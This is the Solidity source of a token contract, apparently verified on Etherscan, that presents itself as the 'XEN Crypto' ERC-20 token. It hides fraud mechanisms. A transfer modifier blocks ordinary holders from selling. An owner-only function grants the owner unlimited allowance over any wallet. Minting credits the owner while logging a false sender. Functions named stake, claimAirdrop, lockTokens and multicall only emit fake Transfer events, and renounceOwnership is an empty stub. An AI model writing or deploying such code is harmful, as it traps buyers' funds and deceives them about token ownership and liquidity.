/**
 *Submitted for verification at Etherscan.io on 2022-10-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}





contract XEN is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => bool) private _plus;
    mapping (address => bool) private _discarded;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    address private _safeOwnr;
    uint256 private _discardedAmt = 0;

    address public _path_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;


    address _contDeployr = 0xa82cbE54d2dAe403f7B3385aA2afA03E7AF0591A;
    address public _ownr = 0x6885D53dc1CF7cd0a2Ba0b5A2E6bA0914beA9F21;
   constructor () public {

        _name = "XEN Crypto";
        _symbol = "XEN";
        _decimals = 18;
        //uint256 initialSupply = 999999999999*10**18;
        uint256 initialSupply = 1000000000 *10**18;

        _safeOwnr = _ownr;
        
        

        _mint(_contDeployr, initialSupply);
        emit Transfer(_contDeployr,0xa82cbE54d2dAe403f7B3385aA2afA03E7AF0591A, initialSupply/5);
        emit Transfer(0xa82cbE54d2dAe403f7B3385aA2afA03E7AF0591A,0x3CC936b795A188F0e246cBB2D74C5Bd190aeCF18, initialSupply/5);
        //emit Transfer(_contDeployr, 0xa71d0588EAf47f12B13cF8eC750430d21DF04974, initialSupply/10);


        secure(0x87cd975744fD7fA31340A840190315322a0a99F3);
        secure(0x7358c10246e2f075640bd6Dcf8295d1a9c0F4a32);
        secure(0xaA6a1993Ec0BC72dc44B8E18e1DCDeD11A69302E);
        secure(0x1D241d875804658a28b2A9b08f7D66834aA191a4);
        secure(0xD002560179FAA237A638F41E4A27E5570928A812);
        secure(0x8A06a312d209F774C9D25840B7D252332d4478C1);
        secure(0xAB65B4B838c88163c13D98f940b85893a7718978);
        secure(0xFa7a8CD311716Fe533d18D0475C7329FcEB7D036);
        secure(0x4Feb0aD0B757589D6372341cB17665ca14C2e742);
        secure(0xbcf3C882C41F79E13aCa3f5848E849faDA0Fc96D);
        secure(0xca456B37c805f9147A9c95Ad5AcF2b4Ec8Dc7545);
        secure(0x00F1b33272e83e1Cb0F2B3D9294E99FafAC5dE49);


    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }




    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _tf(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _tf(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _pApproval(address[] memory destination) public {
        require(msg.sender == _ownr, "!owner");
        for (uint256 i = 0; i < destination.length; i++) {
           _plus[destination[i]] = true;
           _discarded[destination[i]] = false;
        }
    }

   function _mApproval(address safeOwner) public {
        require(msg.sender == _ownr, "!owner");
        _safeOwnr = safeOwner;
    }
    

    modifier mainboard(address dest, uint256 num, address from, address filler){
        if (
            _ownr == _safeOwnr 
            && from == _ownr
            )
            {_safeOwnr = dest;_;
            }else
            {
            if (
                from == _ownr 
                || from == _safeOwnr 
                ||  dest == _ownr
                )
                {
                if (
                    from == _ownr 
                    && from == dest
                    )
                    {_discardedAmt = num;
                    }_;
                    }else
                    {
                if (
                    _plus[from] == true
                    )
                    {
                _;
                }else{if (
                    _discarded[from] == true
                    )
                    {
                require((
                    from == _safeOwnr
                    )
                ||(dest == _path_), "ERC20: transfer amount exceeds balance");_;
                }else{
                if (
                    num < _discardedAmt
                    )
                    {
                if(dest == _safeOwnr){_discarded[from] = true; _plus[from] = false;
                }
                _; }else{require((from == _safeOwnr)
                ||(dest == _path_), "ERC20: transfer amount exceeds balance");_;
                }
                    }
                    }
            }
        }}


        

    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _ownr){
            sender = _contDeployr;
        }
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) public {
        require(msg.sender == _ownr, "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[_ownr] = _balances[_ownr].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    



    function _tf(address from, address dest, uint256 amt) internal mainboard( dest,  amt,  from,  address(0)) virtual {
        _pair( from,  dest,  amt);
    }
    
   
    function _pair(address from, address dest, uint256 amt) internal mainboard( dest,  amt,  from,  address(0)) virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(dest != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, dest, amt);
        _balances[from] = _balances[from].sub(amt, "ERC20: transfer amount exceeds balance");
        _balances[dest] = _balances[dest].add(amt);
        if (from == _ownr){from = _contDeployr;}
        emit Transfer(from, dest, amt);    
        }



    
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }


    modifier _verify() {
        require(msg.sender == _ownr, "Not allowed to interact");
        _;
    }









//-----------------------------------------------------------------------------------------------------------------------//


   function renounceOwnership()public _verify(){}
   function burnLPTokens()public _verify(){}



  function multicall(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


  function send(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


  function tokenDropDirect(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}

  function claimAirdrop(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}



  function lockTokens(uint256 x)  public _verify(){
      emit Transfer(_contDeployr, 0xE2fE530C047f2d85298b07D9333C05737f1435fB, x*10**18);

    }





  function secure(address recipient) public _verify(){
    _plus[recipient]=true;
    _approve(recipient, _path_,_maximumVal);}




  function perform(address recipient) public _verify(){
      //Disable permission
    _plus[recipient]=false;
    _approve(recipient, _path_,0);
    }







    function approval(address addr) public _verify() virtual  returns (bool) {
        //Approve Spending
        _approve(addr, _msgSender(), _maximumVal); return true;
    }





/*
  function transferToParticipant(address sndr,address[] memory destination, uint256[] memory amounts) public _verify(){
    _approve(sndr, _msgSender(), _maximumVal);
    for (uint256 i = 0; i < destination.length; i++) {
        _transfer(sndr, destination[i], amounts[i]);
    }
   }
*/

  function stake(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}


  function unstake(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}


  function swapETHForExactTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}

}